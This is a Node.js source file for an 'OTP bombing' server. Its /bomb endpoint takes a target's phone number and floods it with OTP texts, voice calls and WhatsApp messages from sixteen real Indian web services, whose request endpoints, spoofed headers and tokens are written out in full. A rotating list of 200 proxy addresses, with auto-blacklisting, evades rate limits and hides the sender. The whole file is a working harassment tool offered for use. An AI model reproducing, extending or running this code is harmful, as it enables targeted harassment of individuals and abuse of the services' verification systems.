// ============================================================
// api_server.js - OTP Bombing API Server (FINAL + PROXY)
// 16 Working APIs | Proxy Rotation | 10min Cap | Logs | Delay
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// 🔥 CONFIGURATION
const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;
const API_DELAY_MS = 50;
const PROXY_TIMEOUT = 8000;

// ============================================================
// 🌐 PROXY LIST — 200 PROXIES
// ============================================================

const PROXY_LIST = [
    "1.0.136.129:8080",
    "1.0.170.50:8080",
    "1.1.109.141:9999",
    "1.1.189.58:8080",
    "1.1.220.100:8080",
    "1.10.141.115:8080",
    "1.10.146.76:3128",
    "1.117.83.95:80",
    "1.179.147.5:52210",
    "1.179.148.33:1080",
    "1.179.148.9:36476",
    "1.179.148.9:55636",
    "1.179.172.45:31225",
    "1.179.199.130:33333",
    "1.179.231.130:8080",
    "1.180.0.162:7302",
    "1.180.49.222:7302",
    "1.2.252.65:8080",
    "1.20.169.102:8080",
    "1.212.157.114:4145",
    "1.234.153.14:80",
    "1.4.198.167:8080",
    "1.52.198.150:16000",
    "1.52.198.221:16000",
    "1.54.172.229:16000",
    "1.9.167.35:60489",
    "100.1.53.24:5678",
    "100.27.183.62:8080",
    "101.108.112.243:8080",
    "101.108.113.83:8080",
    "101.109.107.206:8080",
    "101.109.119.24:8080",
    "101.109.217.20:8080",
    "101.109.245.200:4153",
    "101.109.76.109:4145",
    "101.128.107.36:1111",
    "101.128.93.144:8090",
    "101.2.161.118:8080",
    "101.200.241.24:3128",
    "101.251.204.174:8080",
    "101.255.106.94:8080",
    "101.255.107.118:8080",
    "101.255.119.206:8080",
    "101.255.119.26:8080",
    "101.255.137.49:80",
    "101.255.138.82:80",
    "101.255.148.2:8080",
    "101.255.150.238:1080",
    "101.255.158.78:1111",
    "101.255.166.134:1111",
    "101.255.208.18:8090",
    "101.255.208.62:8080",
    "101.255.210.1:1111",
    "101.255.210.1:11116",
    "101.255.211.42:1111",
    "101.255.211.54:8082",
    "101.255.32.42:8080",
    "101.255.53.105:8080",
    "101.255.69.26:8080",
    "101.32.34.4:8118",
    "101.47.16.15:7890",
    "101.51.121.29:4153",
    "101.51.138.138:8080",
    "101.91.242.198:6688",
    "102.0.0.118:80",
    "102.0.16.226:8080",
    "102.0.17.164:8080",
    "102.0.18.120:8080",
    "102.0.18.198:8080",
    "102.0.21.156:8080",
    "102.0.8.23:8080",
    "102.0.9.114:8080",
    "102.135.142.234:12354",
    "102.135.195.90:8082",
    "102.141.30.2:33333",
    "102.164.215.88:8080",
    "102.164.220.243:8080",
    "102.164.252.150:8080",
    "102.165.125.102:5678",
    "102.177.176.0:80",
    "102.177.176.100:80",
    "102.177.176.101:80",
    "102.177.176.102:80",
    "102.177.176.103:80",
    "102.177.176.104:80",
    "102.177.176.105:80",
    "102.177.176.106:80",
    "102.177.176.107:80",
    "102.177.176.108:80",
    "102.177.176.109:80",
    "102.177.176.10:80",
    "102.177.176.110:80",
    "102.177.176.111:80",
    "102.177.176.112:80",
    "102.177.176.113:80",
    "102.177.176.114:80",
    "102.177.176.115:80",
    "102.177.176.116:80",
    "102.177.176.117:80",
    "102.177.176.118:80",
    "102.177.176.119:80",
    "102.177.176.11:80",
    "102.177.176.120:80",
    "102.177.176.121:80",
    "102.177.176.122:80",
    "102.177.176.123:80",
    "102.177.176.124:80",
    "102.177.176.125:80",
    "102.177.176.126:80",
    "102.177.176.127:80",
    "102.177.176.128:80",
    "102.177.176.129:80",
    "102.177.176.12:80",
    "102.177.176.130:80",
    "102.177.176.131:80",
    "102.177.176.132:80",
    "102.177.176.133:80",
    "102.177.176.134:80",
    "102.177.176.135:80",
    "102.177.176.136:80",
    "102.177.176.137:80",
    "102.177.176.138:80",
    "102.177.176.139:80",
    "102.177.176.13:80",
    "102.177.176.140:80",
    "102.177.176.141:80",
    "102.177.176.142:80",
    "102.177.176.143:80",
    "102.177.176.144:80",
    "102.177.176.145:80",
    "102.177.176.146:80",
    "102.177.176.147:80",
    "102.177.176.148:80",
    "102.177.176.149:80",
    "102.177.176.14:80",
    "102.177.176.150:80",
    "102.177.176.151:80",
    "102.177.176.152:80",
    "102.177.176.153:80",
    "102.177.176.154:80",
    "102.177.176.155:80",
    "102.177.176.156:80",
    "102.177.176.157:80",
    "102.177.176.158:80",
    "102.177.176.159:80",
    "102.177.176.15:80",
    "102.177.176.160:80",
    "102.177.176.161:80",
    "102.177.176.162:80",
    "102.177.176.163:80",
    "102.177.176.164:80",
    "102.177.176.165:80",
    "102.177.176.166:80",
    "102.177.176.167:80",
    "102.177.176.168:80",
    "102.177.176.169:80",
    "102.177.176.16:80",
    "102.177.176.170:80",
    "102.177.176.171:80",
    "102.177.176.172:80",
    "102.177.176.173:80",
    "102.177.176.174:80",
    "102.177.176.175:80",
    "102.177.176.176:80",
    "102.177.176.177:80",
    "102.177.176.178:80",
    "102.177.176.179:80",
    "102.177.176.17:80",
    "102.177.176.180:80",
    "102.177.176.181:80",
    "102.177.176.182:80",
    "102.177.176.183:80",
    "102.177.176.184:80",
    "102.177.176.185:80",
    "102.177.176.186:80",
    "102.177.176.187:80",
    "102.177.176.188:80",
    "102.177.176.189:80",
    "102.177.176.18:80",
    "102.177.176.190:80",
    "102.177.176.191:80",
    "102.177.176.192:80",
    "102.177.176.193:80",
    "102.177.176.194:80",
    "102.177.176.195:80",
    "102.177.176.196:80",
    "102.177.176.197:80",
    "102.177.176.198:80",
    "102.177.176.199:80",
    "102.177.176.19:80",
    "102.177.176.1:80",
    "102.177.176.200:80",
    "102.177.176.201:80",
    "102.177.176.202:80",
    "102.177.176.203:80",
    "102.177.176.204:80",
    "102.177.176.205:80",
    "102.177.176.206:80",
    "102.177.176.207:80"
];

// ============================================================
// 🔄 PROXY ROTATION STATE
// ============================================================

let _proxyIdx = 0;
const _deadProxies = new Set();
const _proxyStats = {
    totalAttempts: 0,
    successCount: 0,
    failCount: 0,
    deadCount: 0
};

/**
 * Round-robin proxy selector with dead proxy skip
 */
function getNextProxy() {
    if (PROXY_LIST.length === 0) return null;
    
    let tried = 0;
    while (tried < PROXY_LIST.length) {
        const proxyStr = PROXY_LIST[_proxyIdx % PROXY_LIST.length];
        _proxyIdx++;
        tried++;
        
        if (!_deadProxies.has(proxyStr)) {
            return proxyStr;
        }
    }
    return null; // All proxies dead
}

/**
 * Mark proxy as dead (auto-blacklist)
 */
function markProxyDead(proxyStr) {
    if (proxyStr && !_deadProxies.has(proxyStr)) {
        _deadProxies.add(proxyStr);
        _proxyStats.deadCount = _deadProxies.size;
        console.log(`💀 Proxy marked DEAD: ${proxyStr} (Total dead: ${_deadProxies.size}/${PROXY_LIST.length})`);
    }
}

/**
 * Get axios proxy config
 */
function getProxyConfig(proxyStr) {
    if (!proxyStr) return {};
    
    try {
        const proxyUrl = `http://${proxyStr}`;
        return {
            httpAgent: new HttpProxyAgent(proxyUrl),
            httpsAgent: new HttpsProxyAgent(proxyUrl),
            proxy: false // Disable axios default proxy handling (agents handle it)
        };
    } catch (e) {
        return {};
    }
}

console.log(`🌐 Loaded ${PROXY_LIST.length} proxies`);
console.log(`🔄 Proxy rotation: ENABLED (round-robin)`);
console.log(`💀 Auto-blacklist dead proxies: ENABLED`);

// ============================================================
// ===== 16 WORKING APIs =====
// ============================================================

const APIS = [
    // ===== 🟢 TIER 1 — RELIABLE (6 APIs) =====
    {
        name: "GetInstaCash",
        method: "POST",
        url: "https://getinstacash.in/sell/getData.php",
        headers: {
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Origin": "https://getinstacash.in",
            "Referer": "https://getinstacash.in/sell/login"
        },
        data: { "_raw": "type=sendOTP&mobile={phone}" }
    },
    {
        name: "Flipkart_2",
        method: "GET",
        url: "https://img1a.flixcart.com/batman-returns/batman-returns/p/images/logo_lite-cbb357.png",
        headers: {
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login/verify?type=mobile&verificationType=otp&loginIdentifier={phone}&loginIdentifierPrefix=%2B91&sourceContext=default"
        }
    },
    {
        name: "AakashDigital_2",
        method: "POST",
        url: "https://digital.aakash.ac.in/signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/user/register"
        },
        data: { "_raw": "&mobileval={phone}" }
    },
    {
        name: "RedBus_1",
        method: "GET",
        url: "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.redbus.in/preregister"
        }
    },
    {
        name: "Snapdeal",
        method: "POST",
        url: "https://m.snapdeal.com/signupCompleteAjax",
        headers: {
            "xc": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In19",
            "h2": "true",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "xg": "eyJ3YXAiOnsiY3BkcCI6ImZhbHNlIiwic2RhdGEiOiIyIiwicG92IjoidHJ1ZSJ9LCJzYyI6eyJtbCI6IjMiLCJjb2RfYiI6ImZhbHNlIiwiZGFfYXMiOiJ2ZXIyIiwic2hpcHBpbmdfaW50ZXJ2YWwiOiI5OHAzIn0sImNtcyI6eyJ2biI6IjAifSwicHMiOnsic3BfaW5jbCI6InRydWUiLCJzcF9zbGFiIjoiRCIsInVybCI6IkM0In0sInVpZCI6eyJndWlkIjoiMWMwNzhhMTMtZGU1My00ZDRkLTkwOTgtNzFmM2JlOTY5YjJiIn19fHwxNjAwODEzMDIyNTk1",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "u": "160081122259159083",
            "accept": "*/*",
            "origin": "https://m.snapdeal.com",
            "referer": "https://m.snapdeal.com/signin"
        },
        data: { "_raw": "j_password=null&j_mobilenumber={phone}&agree=true&j_confpassword=null&journey=mobile&numberEdit=false&swp=true&j_fullname=uyuhyntuhy" }
    },
    {
        name: "Quikr",
        method: "POST",
        url: "https://www.quikr.com/core/sendOtp?_t=0e2ed2ef8cff0015a917b9cf98ccaea3",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.quikr.com",
            "referer": "https://www.quikr.com/"
        },
        data: { "_raw": "user={phone}&v3=true" }
    },

    // ===== 🟡 TIER 2 — PURANI WORKING (5 APIs) =====
    {
        name: "Tata Capital Voice",
        url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone, isOtpViaCallAtLogin: "true" })
    },
    {
        name: "Ogonn",
        method: "POST",
        url: "https://ogonn.in/otp",
        headers: {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "origin": "https://ogonn.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://ogonn.in/login"
        },
        data: { "_raw": "_token=I10LMVWBAN1c30T8SbgVHHvlKFTgTU1iFTm7hlfl&mobile={phone}" }
    },
    {
        name: "AakashDigital_1",
        method: "POST",
        url: "https://digital.aakash.ac.in/mkt-signup-otp-verify",
        headers: {
            "accept": "*/*",
            "origin": "https://digital.aakash.ac.in",
            "x-requested-with": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "referer": "https://digital.aakash.ac.in/"
        },
        data: { "_raw": "&mobileval={phone}&otp=6230" }
    },
    {
        name: "Flipkart_1",
        method: "POST",
        url: "https://1.rome.api.flipkart.com/1/action/view",
        headers: {
            "x-user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5FKUA/msite/0.0.3/msite/Mobile",
            "Origin": "https://www.flipkart.com",
            "User-Agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "content-type": "application/json",
            "Accept": "*/*",
            "Referer": "https://www.flipkart.com/login"
        },
        data: {
            "actionRequestContext": {
                "type": "LOGIN_IDENTITY_VERIFY",
                "loginIdPrefix": "+91",
                "loginId": "{phone}",
                "clientQueryParamMap": { "ret": "/?affid=siteplug&affExtParam1=e2f29ff2e3dd9e65eb9e419d30dc8135", "entryPage": "HOMEPAGE_HEADER_ACCOUNT" },
                "loginType": "MOBILE",
                "verificationType": "OTP",
                "screenName": "LOGIN_V4_MOBILE",
                "sourceContext": "DEFAULT"
            }
        }
    },
    {
        name: "Netmeds",
        method: "GET",
        url: "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "referer": "https://m.netmeds.com/customer/account/login"
        }
    },

    // ===== 🟢 TIER 3 — NAYI WORKING (5 APIs) =====
    {
        name: "Vedantu",
        method: "POST",
        url: "https://user.vedantu.com/user/preLoginVerification",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
            "content-type": "application/json",
            "accept": "*/*",
            "origin": "https://www.vedantu.com",
            "referer": "https://www.vedantu.com/"
        },
        data: { "email": null, "phoneCode": "+91", "phoneNumber": "{phone}", "ver": "11.345" }
    },
    {
        name: "KPN WhatsApp",
        url: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
        method: "POST",
        headers: { "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8" },
        data: (phone) => JSON.stringify({ notification_channel: "WHATSAPP", phone_number: { country_code: "+91", number: phone } })
    },
    {
        name: "Oyo_1",
        method: "POST",
        url: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "text/plain;charset=UTF-8",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login"
        },
        data: { "phone": "{phone}", "country_code": "+91", "nod": 4 }
    },
    {
        name: "Ullu",
        method: "POST",
        url: "https://ullu.app/ulluCore/api/v1/otp/sendRegisterOTP?mobileNumber={phone}",
        headers: {
            "accept": "application/json, text/plain, */*",
            "origin": "https://ullu.app",
            "user-agent": "Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.134 Mobile Safari/537.36 OppoBrowser/2.2.5",
            "referer": "https://ullu.app/"
        },
        data: {}
    },
    {
        name: "Hungama OTP",
        url: "https://communication.api.hungama.com/v1/communication/otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNo: phone, countryCode: "+91", appCode: "un" })
    }
];

console.log(`✅ Loaded ${APIS.length} working APIs`);
console.log(`⏱️  Max duration cap: ${MAX_DURATION_MIN} minutes`);
console.log(`⏳ API delay: ${API_DELAY_MS}ms | Batch delay: ${BATCH_DELAY_MS}ms`);

// ============================================================
// ===== API CALL FUNCTION (WITH PROXY) =====
// ============================================================

function makeFallbackData(phone, apiName) {
    const lower = apiName.toLowerCase();
    if (lower.includes('voice') || lower.includes('call')) {
        return JSON.stringify({ mobile: phone });
    }
    if (lower.includes('whatsapp')) {
        return JSON.stringify({ mobile: phone, channel: "whatsapp" });
    }
    return JSON.stringify({ mobile: phone });
}

async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    
    // 🌐 Get rotating proxy
    const proxyStr = getNextProxy();
    const proxyConfig = getProxyConfig(proxyStr);
    
    _proxyStats.totalAttempts++;
    
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['Content-Length'];
        delete headers['host'];
        delete headers['Host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') {
                    rawData = rawData.replace(/{phone}/g, phone);
                }
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) {
                            newObj[key] = replacePhone(obj[key]);
                        }
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        } else {
            data = makeFallbackData(phone, api.name);
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: PROXY_TIMEOUT,
            ...proxyConfig
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) {
                    headers['Content-Type'] = 'application/json';
                }
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        
        _proxyStats.successCount++;
        
        return { 
            status: response.status, 
            success: true, 
            responseTime,
            proxy: proxyStr
        };
        
    } catch (err) {
        const responseTime = Date.now() - startTime;
        
        // 🔥 Check if proxy failed
        const isProxyError = 
            err.code === 'ECONNREFUSED' ||
            err.code === 'ECONNRESET' ||
            err.code === 'ETIMEDOUT' ||
            err.code === 'ECONNABORTED' ||
            err.code === 'ENOTFOUND' ||
            err.message?.includes('proxy') ||
            err.message?.includes('tunneling') ||
            err.message?.includes('socket hang up');
        
        // Mark proxy dead if it failed multiple times
        if (isProxyError && proxyStr) {
            markProxyDead(proxyStr);
        }
        
        _proxyStats.failCount++;
        
        // 🔄 Retry with next proxy (max 2 retries)
        if (retryCount < 2) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        
        return { 
            status: null, 
            success: false, 
            responseTime,
            proxy: proxyStr,
            error: err.message
        };
    }
}

// ============================================================
// ===== ROUTES =====
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        instance: process.env.INSTANCE_NAME || 'api',
        apis: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        proxy_stats: {
            total_proxies: PROXY_LIST.length,
            dead_proxies: _deadProxies.size,
            alive_proxies: PROXY_LIST.length - _deadProxies.size,
            total_attempts: _proxyStats.totalAttempts,
            success: _proxyStats.successCount,
            fail: _proxyStats.failCount
        },
        uptime: process.uptime()
    });
});

// 🔥 Proxy stats route
app.get('/proxy-stats', (req, res) => {
    res.json({
        total_proxies: PROXY_LIST.length,
        dead_proxies: _deadProxies.size,
        alive_proxies: PROXY_LIST.length - _deadProxies.size,
        dead_proxy_list: Array.from(_deadProxies),
        stats: _proxyStats
    });
});

// 🔥 Reset dead proxies
app.post('/reset-proxies', (req, res) => {
    const count = _deadProxies.size;
    _deadProxies.clear();
    _proxyStats.deadCount = 0;
    console.log(`♻️  Reset ${count} dead proxies`);
    res.json({ success: true, message: `Reset ${count} dead proxies`, total_alive: PROXY_LIST.length });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone number. Must be 10 digits.' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    console.log(`\n📱 Bombing ${phone} | Requested: ${requestedDuration}min | Effective: ${effectiveDuration}min | Instance: ${instance || 'default'}`);
    console.log(`🌐 Using ${PROXY_LIST.length - _deadProxies.size}/${PROXY_LIST.length} alive proxies`);

    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0, callCount = 0, whatsappCount = 0;
        const apiList = APIS;
        const BATCH_SIZE = 5;
        
        let maxRequests = 100;
        if (effectiveDuration <= 1) maxRequests = 200;
        else if (effectiveDuration <= 5) maxRequests = 150;
        else if (effectiveDuration <= 10) maxRequests = 100;
        else maxRequests = 80;

        const shuffled = [...apiList];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }

        let sent = 0;
        for (let i = 0; i < shuffled.length && sent < maxRequests; i += BATCH_SIZE) {
            const batch = shuffled.slice(i, Math.min(i + BATCH_SIZE, shuffled.length));
            
            const results = await Promise.allSettled(
                batch.map(api => makeApiCall(api, phone))
            );
            
            for (let k = 0; k < results.length; k++) {
                const result = results[k];
                const api = batch[k];
                
                if (result.status === 'fulfilled' && result.value && result.value.success) {
                    success++;
                    sent++;
                    const apiName = api.name || '';
                    const isCall = apiName.toLowerCase().includes('call') || apiName.toLowerCase().includes('voice');
                    const isWhatsapp = apiName.toLowerCase().includes('whatsapp');
                    const type = isCall ? 'CALL' : (isWhatsapp ? 'WA' : 'SMS');
                    
                    console.log(`  ✅ [${success}] ${apiName} → ${result.value.status} (${result.value.responseTime}ms) [${type}] via ${result.value.proxy || 'direct'}`);
                    
                    if (isCall) callCount++;
                    else if (isWhatsapp) whatsappCount++;
                    else smsCount++;
                } else {
                    const apiName = api.name || '';
                    const status = result.value?.status || 'FAIL';
                    const responseTime = result.value?.responseTime || 0;
                    console.log(`  ❌ ${apiName} → ${status} (${responseTime}ms) via ${result.value?.proxy || 'direct'}`);
                }
            }
            
            if (i + BATCH_SIZE < shuffled.length && sent < maxRequests) {
                await new Promise(r => setTimeout(r, BATCH_DELAY_MS));
            }
        }

        const elapsed = (Date.now() - startTime) / 1000;
        
        console.log(`✅ Bombing ${phone} done | Sent: ${success} | SMS: ${smsCount} | Calls: ${callCount} | WA: ${whatsappCount} | ${elapsed.toFixed(1)}s`);
        console.log(`📊 Proxy stats: ${_deadProxies.size} dead / ${PROXY_LIST.length} total\n`);
        
        res.json({
            success: true,
            phone,
            requested_duration: requestedDuration,
            effective_duration: effectiveDuration,
            instance: instance || 'default',
            totalSent: success,
            sms: smsCount,
            calls: callCount,
            whatsapp: whatsappCount,
            elapsed: elapsed.toFixed(1) + 's',
            proxy_stats: {
                total: PROXY_LIST.length,
                dead: _deadProxies.size,
                alive: PROXY_LIST.length - _deadProxies.size
            }
        });
        
    } catch (error) {
        console.error('Bombing error:', error);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        max_duration_min: MAX_DURATION_MIN,
        api_delay_ms: API_DELAY_MS,
        total_proxies: PROXY_LIST.length,
        apis: APIS.map(a => a.name),
        instances: process.env.INSTANCE_NAME || 'api'
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on port ${PORT}`);
    console.log(`📡 Instance: ${process.env.INSTANCE_NAME || 'default'}`);
    console.log(`📊 APIs loaded: ${APIS.length}`);
    console.log(`🌐 Proxies loaded: ${PROXY_LIST.length}`);
    console.log(`⏱️  Max duration: ${MAX_DURATION_MIN} minutes (highest cap)`);
    console.log(`⏳ API delay: ${API_DELAY_MS}ms`);
    console.log(`⏳ Batch delay: ${BATCH_DELAY_MS}ms`);
    console.log(`🔄 Proxy rotation: ENABLED (round-robin)`);
    console.log(`💀 Auto-blacklist: ENABLED`);
});
